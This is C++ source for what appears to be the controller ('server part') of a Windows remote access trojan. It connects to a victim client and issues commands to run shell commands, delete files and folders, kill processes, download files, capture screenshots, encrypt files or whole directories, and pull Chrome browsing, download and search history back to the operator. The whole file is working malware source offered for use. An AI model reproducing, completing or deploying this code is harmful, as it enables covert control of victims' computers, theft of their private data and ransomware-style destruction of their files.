/*
 * WARNING!
 * This software is the full property of the author
 * server part
*/

#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <vector>
#include <process.h>

#include "Menu.h"
#include "Config.h"
#include "Utils.h"

char buffer[100000];
int command;
std::string path, key;
std::string temp_file_name;

enum commands {
	HELP = 1,
	CLOSE,
	PWD,
	CMD,
	LS,
	RM,
	RMDIR,
	INFO,
	PS,
	KILL,
	DUMP,
	DOWNLOAD,
	ERR,
	SCREENCAP,
	CRYPTFILE,
	CRYPTDIR,
	CHROME_ST,
};

int main() {
	system("cls");
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	PrintGreeting();


	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 2);
	if (WSAStartup(DLLVersion, &wsaData)) {
		throw_error("Error WSAStartup");
		exit(1);
	}

	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.S_un.S_addr = inet_addr(IP);
	addr.sin_port = htons(PORT);
	addr.sin_family = AF_INET;

	
	SOCKET sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	if (!bind) throw_error("binding error");
	listen(sListen, SOMAXCONN);
	
	SetConsoleTextAttribute(hConsole, 7);
	timenow();
	std::cout << " platform: ";
	SetConsoleTextAttribute(hConsole, 3);
	std::cout << "windows\n";
	SetConsoleTextAttribute(hConsole, 7);
	timenow();
	std::cout << " [";
	SetConsoleTextAttribute(hConsole, 4);
	std::cout << "start";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "] server ";
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << IP;
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << ":";
	SetConsoleTextAttribute(hConsole, 12);
	std::cout << PORT << std::endl;
	SetConsoleTextAttribute(hConsole, 7);

	timenow();
	std::cout << " listening ...\n";
	SOCKET conn = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
	if (!conn) throw_error("accept error");
	else {
		timenow();
		std::cout << " Sucessful Connected!\ntype help to print HELP [MENU]\n";
		while (true) {
			memset(&buffer, 0x0, sizeof(buffer));

			timenow();
			std::cout << " command";

			SetConsoleTextAttribute(hConsole, 13);
			std::cout << "> ";
			SetConsoleTextAttribute(hConsole, 7);

			// get number from cin
			std::string com_buf;
			std::getline(std::cin, com_buf);
			int num = parse(com_buf);
			if (num) {
				command = num;
			} else {
				const char* b = com_buf.c_str();
				command = atoi(b);
			}
			switch (command) {
			case HELP:
				HelpMenu();
				break;

			case CLOSE:
				send(conn, "close", 5, NULL);
				timenow();

				SetConsoleTextAttribute(hConsole, 12);
				std::cout << " close connection\n";
				SetConsoleTextAttribute(hConsole, 7);

				return 1;

			case PWD:
				send(conn, "pwd", 3, NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;

			case LS:
				send(conn, "ls", 2, NULL);
				std::cout << "enter path > ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;

			case RM:
				send(conn, "rm", 2, NULL);
				std::cout << "enter path > ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;

			case RMDIR:
				send(conn, "rmdir", 5, NULL);
				std::cout << "enter path > ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;

			case INFO:
				send(conn, "info", 4, NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;
			case PS:
				send(conn, "ps", 2, NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;

			case KILL:
				send(conn, "kill", 4, NULL);
				std::cout << "enter name > ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;

			case DUMP:
				send(conn, "dump", 4, NULL);

				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;

			case DOWNLOAD:
				send(conn, "download", 8, NULL);
				std::cout << "full path to file > ";
				std::getline(std::cin, path);

				// get file name
				for (unsigned int item = 0; item < path.length(); ++item) {
					if ((path[item] == '\\') || (path[item] == '/')) {
						temp_file_name = "";
						for (unsigned int i = item + 1; i < path.length(); ++i) {
							temp_file_name += path[i];
						}
					}
				}

				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);

				// make the folder "downloads"
				if (!dirExists("downloads"))
					_wmkdir(L"downloads");

				if (!strcmp(buffer, "exist")) {
					timenow();
					std::cout << " file exist\n";
				} else {
					std::ofstream wr("downloads\\" + temp_file_name, std::ios::binary);
					wr << buffer;
					timenow();
					std::cout << " download: /downloads/" << temp_file_name << " succes\n";
				}
				break;
			case ERR:
				send(conn, "error", 5, NULL);
				std::cout << "enter name error > ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "ok\n";
				break;			
			case SCREENCAP:
				send(conn, "screencap", 9, NULL);
				if (!dirExists("screenshot")) _wmkdir(L"screenshot");

				if (strncmp(buffer, "none", 4)) {
					std::ofstream history("screenshot\\screenshot.png");
					std::vector <char> buffer(4096);
					FILE* file = fopen("screenshot\\screenshot.png", "wb");
					if (file != nullptr) {
						long received;					
						bool started = false;
						while ((received = recv(conn, buffer.data(), buffer.size(), 0)) > 0) {
							fwrite(buffer.data(), 1, received, file);
							if (!started)
							{
								std::cout << "Receiving..." << std::endl;
								started = true;
							}
						}
						fclose(file);
					}
					std::cout << " history write pic\\screenshot.png" << std::endl;
					timenow();
					
				}
				else {
					timenow();
					std::cout << " null screenshot";
				}
				break;
			case CMD:
				send(conn, "cmd", 3, NULL);
				std::cout << "enter cmd command > ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "ok\n";
				break;
			case CRYPTFILE:
				send(conn, "cryptfile", 9, NULL);
				std::cout << "path to file => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-100) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";

				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;
			case CRYPTDIR:
				send(conn, "cryptdir", 8, NULL);
				std::cout << "path to directory => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-100) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
				break;
			case CHROME_ST:
				send(conn, "chrome_st", 9, NULL);
				recv(conn, buffer, sizeof(buffer), NULL);

				if (!dirExists("chrome")) _wmkdir(L"chrome");

				if (strncmp(buffer, "none", 4)) {
					std::ofstream history("chrome\\history.txt");
					history << buffer;
					timenow();
					std::cout << " history write chrome\\history.txt" << std::endl;
					history.close();
				}
				else {
					timenow();
					std::cout << " null history";
				}

				Sleep(1000);

				memset(&buffer, 0x0, sizeof(buffer));
				recv(conn, buffer, sizeof(buffer), NULL);
				if (strncmp(buffer, "none", 4)) {
					std::ofstream downloads("chrome\\downloads.txt");
					downloads << buffer;
					timenow();
					std::cout << " downloads write chrome\\downloads.txt" << std::endl;
					downloads.close();
				}
				else {
					timenow();
					std::cout << " null downloads";
				}

				Sleep(1000);

				memset(&buffer, 0x0, sizeof(buffer));
				recv(conn, buffer, sizeof(buffer), NULL);
				if (strncmp(buffer, "none", 4)) {
					std::ofstream requests("chrome\\search_history.txt");
					requests << buffer;
					timenow();
					std::cout << " search_history write chrome\\search_history.txt" << std::endl;
					requests.close();
				}
				else {
					timenow();
					std::cout << " null search_history";
				}

			default:
				std::cout << "not supported\n";
			}
		}
	}
	return 0;
}
